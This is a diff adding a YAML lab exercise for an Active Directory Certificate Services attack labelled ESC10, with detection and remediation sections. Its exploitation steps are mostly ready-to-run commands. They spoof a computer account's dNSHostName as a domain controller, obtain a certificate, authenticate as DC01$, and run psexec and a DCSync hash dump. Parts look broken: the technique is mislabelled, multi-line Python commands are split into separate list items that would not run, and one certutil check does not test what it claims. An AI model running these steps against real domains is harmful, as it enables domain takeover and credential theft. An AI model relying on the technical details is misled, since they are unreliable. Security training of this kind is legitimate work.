@@ -1,0 +1,196 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC10 — Weak Certificate Mapping / GenericWrite on Computer Account"
+id: "ad-adcs-esc10-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "120 minutes"
+
+description: |
+  Exploit weak certificate mapping configurations in Active Directory
+  Certificate Services (AD CS) (ESC10). When certificate mapping uses
+  weak validation (e.g., UPN or DNS name mapping without strong SID
+  validation), an attacker with GenericWrite on a computer account can
+  modify the computer's dNSHostName or servicePrincipalName to match
+  a privileged account, request a certificate, and authenticate as that
+  privileged account.
+
+learning_objectives:
+  - Understand weak vs strong certificate mapping in AD
+  - Identify computer accounts with GenericWrite permissions
+  - Abuse computer account attributes for certificate-based impersonation
+  - Map ESC10 to computer account takeover and certificate abuse
+
+tools:
+  - certipy
+  - certify
+  - rubeus
+  - impacket
+  - powermad
+  - bloodhound
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - GenericWrite permission on a computer account
+  - Weak certificate mapping enabled (no strong SID validation)
+  - Network access to AD CS CA (TCP 443 or 135)
+  - Understanding of computer account attributes and certificate mapping
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate computer accounts with GenericWrite permissions"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look for ESC10"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC10|Weak Certificate Mapping|Computer Account)'"
+      - "# BloodHound collection for ACL analysis"
+      - "bloodhound-python -u '[username]' -p '[password]' -d [domain] -dc [dc_ip] -c All"
+      - "# Find computer accounts with GenericWrite"
+      - "python3 -c \"
+      - "import ldap3"
+      - "server = ldap3.Server('[dc_ip]')"
+      - "conn = ldap3.Connection(server, user='[username]@[domain]', password='[password]', auto_bind=True)"
+      - "conn.search('DC=[dc1],DC=[dc2]', '(objectClass=computer)', attributes=['cn', 'dNSHostName', 'servicePrincipalName'])"
+      - "for entry in conn.entries: print(entry)"
+      - """
+    expected_output: "Computer accounts where current user has GenericWrite permissions"
+    detection: "LDAP queries for computer account ACLs; BloodHound collection"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Check certificate mapping configuration and computer account attributes"
+    commands:
+      - "# Check certificate mapping strength"
+      - "# Strong mapping requires SID to be present in certificate"
+      - "# Check if strong mapping is enforced"
+      - "certutil -config '[ca_server]\\[ca_name]' -getreg 'policy\RequestDisposition'"
+      - "# Check computer account attributes"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=[target_computer],CN=Computers,DC=[dc1],DC=[dc2]' '(objectclass=computer)' dNSHostName servicePrincipalName msDS-AdditionalDnsHostName"
+      - "# Check for ms-DS-MachineAccountQuota (allows creating computer accounts)"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'DC=[dc1],DC=[dc2]' '(objectclass=domain)' ms-DS-MachineAccountQuota"
+    expected_output: "Computer account attributes and certificate mapping configuration"
+    detection: "LDAP queries for computer account attributes and domain policies"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Modify computer account dNSHostName to match privileged account"
+    commands:
+      - "# If GenericWrite on computer account, modify dNSHostName"
+      - "# Change dNSHostName to match a privileged computer (e.g., DC)"
+      - "python3 -c \"
+      - "import ldap3"
+      - "server = ldap3.Server('[dc_ip]')"
+      - "conn = ldap3.Connection(server, user='[username]@[domain]', password='[password]', auto_bind=True)"
+      - "conn.modify('CN=[target_computer],CN=Computers,DC=[dc1],DC=[dc2]', {'dNSHostName': [(ldap3.MODIFY_REPLACE, ['dc01.corp.example.com'])]})"
+      - "print(conn.result)"
+      - """
+      - "# Or using PowerShell"
+      - "Set-ADComputer -Identity '[target_computer]' -DNSHostName 'dc01.corp.example.com'"
+      - "# Verify the change"
+      - "Get-ADComputer -Identity '[target_computer]' -Properties dNSHostName"
+    expected_output: "Computer account dNSHostName modified to match privileged computer"
+    detection: "Computer account dNSHostName modification (Event ID 5136)"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Request certificate using modified computer account"
+    commands:
+      - "# Request certificate for the computer account"
+      - "certipy req -u '[target_computer]$@[domain]' -p '[computer_password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template 'Machine'"
+      - "# The certificate will have dNSHostName of dc01.corp.example.com"
+      - "# Verify the certificate"
+      - "openssl pkcs12 -in [target_computer].pfx -nodes -passin pass: | openssl x509 -noout -text | grep -A5 'Subject Alternative Name'"
+    expected_output: "[target_computer].pfx containing certificate with DC's DNS name"
+    detection: "Certificate request for computer account with modified dNSHostName"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Restore computer attributes and authenticate with certificate"
+    commands:
+      - "# Restore original dNSHostName"
+      - "Set-ADComputer -Identity '[target_computer]' -DNSHostName '[original_dns]'"
+      - "# Authenticate with the certificate"
+      - "certipy auth -pfx [target_computer].pfx -dc-ip [dc_ip]"
+      - "# If weak certificate mapping uses DNS name, this authenticates as DC$"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=dc01.ccache"
+      - "impacket-psexec -k -no-pass [domain]/'DC01$'@[dc_ip]"
+      - "# Or perform DCSync"
+      - "impacket-secretsdump -k -no-pass [domain]/'DC01$'@[dc_ip] -just-dc"
+    expected_output: "TGT for DC01$ account; domain hashes extracted via DCSync"
+    detection: "Kerberos authentication with certificate having spoofed DNS hostname"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "MITRE ATT&CK"
+    control: "T1098"
+    description: "Account Manipulation"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-3"
+    description: "Access Enforcement"
+  - standard: "CIS Controls v8"
+    control: "6.8"
+    description: "Define and maintain role-based access control"
+
+detection:
+  network_indicators:
+    - "Computer account attribute modifications followed by certificate requests"
+    - "Certificate authentication using DNS names that don't match the requesting account"
+  log_indicators:
+    - "Event ID 5136 (AD): dNSHostName or servicePrincipalName modified on computer"
+    - "Event ID 4886 (CA): Certificate requested for computer with modified attributes"
+    - "Event ID 4768: Kerberos TGT via certificate with mismatched DNS name"
+    - "Defender for Identity: Suspicious computer account modification"
+  endpoint_indicators:
+    - "Computer account attribute modifications from non-admin accounts"
+    - "Certificate enrollment for computer accounts with recent attribute changes"
+    - "Certipy auth with computer certificates having unexpected DNS names"
+
+remediation:
+  immediate:
+    - "Enable strong certificate mapping with SID validation on all DCs"
+    - "Apply KB5014754 to enforce strong certificate mapping"
+    - "Remove GenericWrite permissions from non-admin users on computer accounts"
+    - "Audit all computer account modifications in the last 90 days"
+    - "Monitor for dNSHostName and servicePrincipalName changes"
+  long_term:
+    - "Implement strict ACL governance on computer accounts"
+    - "Deploy regular BloodHound audits for computer account ACL paths"
+    - "Use strong certificate mapping exclusively (disable UPN/DNS name mapping)"
+    - "Monitor for certificate requests with mismatched identities"
+    - "Consider reducing ms-DS-MachineAccountQuota to 0"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  target_computer: "WORKSTATION01"
+  computer_password: "Password123"
+  original_dns: "workstation01.corp.example.com"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+
+assessment_questions:
+  - "What computer account attribute is modified in an ESC10 attack?"
+  - "How does strong certificate mapping prevent ESC10?"
+  - "What is the difference between ESC9 and ESC10?"
+  - "Why is modifying dNSHostName dangerous in environments with weak certificate mapping?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c9b15-0985-4a2e-8e2d-437ad2a0c2ef"
+    title: "KB5014754 - Certificate-based authentication changes"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
